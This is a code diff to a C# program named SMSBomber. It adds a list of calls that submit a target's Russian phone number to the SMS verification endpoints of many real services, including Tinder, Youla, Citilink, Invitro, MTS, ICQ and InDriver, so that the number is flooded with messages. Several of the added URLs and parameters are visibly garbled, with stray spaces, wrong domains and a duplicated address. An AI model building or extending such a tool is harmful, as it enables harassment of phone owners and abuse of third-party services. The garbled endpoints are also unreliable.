@@ -104,6 +104,22 @@ namespace SMSBomber
                 Send("https://terra-1.indriverapp.com/api/authorization?locale=ru", $"phone_number=+7{number}", "tinder");
                 Send("https://api.ivi.ru/mobileapi/user/register/phone/v6", $"phone_number=+7{number}", "tinder");
 
+                Send("https://api_gotinder.com/v2/auth/sms/send?auth typessms&locale=ru", $"phone_number=+7{number}", "Tinder");
+                Send("https://app.karusel.ru/api/v1/phone", $"phone=8{number}", "Карусель");
+                Send("https://glean.ru/clients-api/v2/smscodes/auth/request_code", $"phone=7{number}", "Qlean");
+                Send("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", $"phone=7 {number}", "AT PRIME");
+                Send("https://youla.ru/web-api/auth/request_code", $"phone=+7{number}", "Юла");
+                Send($"https://unw.citilink.ru/registration/confirm/phone/+ 7{number}/",$"", "CityLink");
+                Send("https://api.sunlight.net/v3/customers/authorization/", $"phone=7{number}", "SunLight");
+                Send("https://1k.invitro.ru/sp/mobileApi/createUserByPassword", $"password=ctclutctc&application=1kp&login= +7{number}", "Invitro");
+                Send("https://api.delitime.ru/api/v2/signup", $"SignupForm[username]=7{number}&SignupForm[device_type]=3", "DeliMobil");
+                Send("https://api.mtstv.ru/v1/users", $"msisdn=7{number}", "МТС");
+                Send("https://moscow.rutaxi.ru/ajax keycode. html", $"l={number}", "Rutaxi");
+                Send("https://www.icq.com/smsreg/reguestPhoneValidation.php icq.com/smsreg/requestPhoneValidation. php", $"msisdn=7{number}&locale=en&countryCode=ru&version=1&k" +
+                $"[-ic1rtwz1s1Hj100r&r=46763", "ICQ");
+                Send("https://terra-1.indriverapp.com/api/authorization?locale=ru", $"node=request&phone=+7{number}&phone_permission=unknown&stream" +
+                $"_id=0&v=3&appversion=3.20.6&osversion=unknown&devicemodel=unknown", "InDriver");
+                Send("https://api.ivi.ru/mobileapi/user/register/phone/v6", $"phone=7{number}", "IVI");
             }
         }
 
